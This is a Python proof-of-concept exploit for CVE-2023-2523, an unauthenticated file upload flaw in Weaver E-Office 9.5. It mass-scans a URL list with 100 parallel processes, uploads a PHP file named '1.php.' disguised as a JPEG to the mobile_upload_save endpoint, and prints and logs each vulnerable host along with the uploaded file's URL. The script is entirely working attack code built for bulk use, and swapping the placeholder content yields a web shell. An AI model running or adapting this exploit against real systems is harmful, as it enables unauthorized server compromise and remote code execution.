import requests,re,argparse,os,sys,time
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''
        _______      ________    ___   ___ ___  ____      ___  _____ ___  ____  
   / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \    |__ \| ____|__ \|___ \ 
  | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____ ) | |__    ) | __) |
  | |      \ \/ / |  __|______/ /| | | |/ / |__ <______/ /|___ \  / / |__ < 
  | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_ ___) |/ /_ ___) |
   \_____|   \/   |______|  |____|\___/____|____/    |____|____/|____|____/ 
                                                                            
                                                version:泛微 E-Office 9.5
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="泛微E-Office9文件上传漏洞 CVE-2023-2523")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='fiel path')

    args = parser.parse_args()

    # print(args.url,args.filr)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")

def poc(target):
    payload = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    url = target + payload
    header = {
        "Cache-Control":"max-age=0  ",
        "Upgrade-Insecure-Requests":"1  ",
        "Origin":"null  ",
        "Content-Type":"multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt  ",
        "Accept-Encoding":"gzip, deflate",
        "Accept-Language":"en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Connection":"keep-alive",
        "Content-Length":"201",
}
    data = (
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
        'Content-Disposition:form-data; name="upload_quwan"; filename="1.php."\r\n'
        'Content-Type:image/jpeg\r\n'
        "\r\n"
        '111\r\n'
        "------WebKitFormBoundarydRVCGWq4Cx3Sq6tt\r\n"
    )
    res = requests.get(url=target,verify=False,timeout=10)
    # print(res.status_code)
    if res.status_code == 200:
        try:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10)
            ree = re.findall("attachment(.*?)1.php",res1.text,re.S)
            result = target+ '/attachment/'+ree[0].replace("\/",'')+'/1.php'  
            # print(ree[0].replace("\/",''))
            if 'eoffice' in res1.text:
                print(f"[+]此url{target}存在漏洞,上传文件后的url为{result}")
                with open('result.txt','a',encoding='utf-8')as f:
                    f.write(target+'\n')
                    return True
            else:
                print(f"[-]此url{target}不存在漏洞")
                return False
        except Exception as e:
            print(f"[*]此url{target}可能存在访问问题，请手工测试")
            return False

if __name__ == '__main__':
    main()
